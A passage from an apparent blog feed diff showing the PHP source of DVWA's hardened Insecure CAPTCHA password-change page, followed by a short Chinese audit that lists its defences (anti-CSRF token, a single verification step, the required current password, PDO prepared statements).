class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h2><ul>
+<li>使用<code>Anti-CSRF token</code>机制防御CSRF攻击。</li>
+<li>验证步骤合并为同一步，无需分开，使得验证环节无法绕过。</li>
+<li>要求输入修改之前的密码，攻击者无法绕过。</li>
+<li>利用<code>PDO</code>技术输入内容过滤，防止了<code>sql</code>注入。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>vuln</category>
+      </categories>
+      <tags>
+        <tag>Insecure CAPTCHA</tag>
       </tags>
   </entry>
   <entry>
